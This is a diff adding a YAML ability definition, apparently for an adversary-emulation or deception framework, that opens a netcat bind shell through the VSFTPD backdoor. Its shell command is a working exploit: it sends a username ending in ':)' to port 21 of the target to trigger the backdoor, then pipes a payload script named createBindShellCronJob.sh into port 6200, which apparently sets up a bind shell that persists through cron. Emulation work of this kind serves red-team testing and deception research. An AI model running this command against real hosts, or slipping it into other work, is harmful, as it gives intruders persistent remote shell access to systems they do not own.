@@ -1,0 +1,19 @@
+---
+
+- id: deception-vsftpd
+  name: Deception open a netcat bind shell with VSFTPD
+  description: open a netcat bind shell on a specific port using the VSFTPD backdoor exploit
+  tactic: deception-lateral-movement
+  repeatable: True
+  technique:
+    attack_id: T9061
+    name: "Remote Services: Netcat Bind Shell using VSFTPD"
+  platforms:
+    linux:
+      sh:
+        command: "{ sleep 1; echo 'user doesnotexist:)\r\n'; echo 'pass doesnotmatter\r\n'; } | ncat #{host.lateralMove.ip} 21 --send-only & 
+        { sleep 5; cat createBindShellCronJob.sh; sleep 10; } | ncat #{host.lateralMove.ip} 6200 --send-only"
+        cleanup:
+        payloads:
+        - createBindShellCronJob.sh
+        timeout: 30
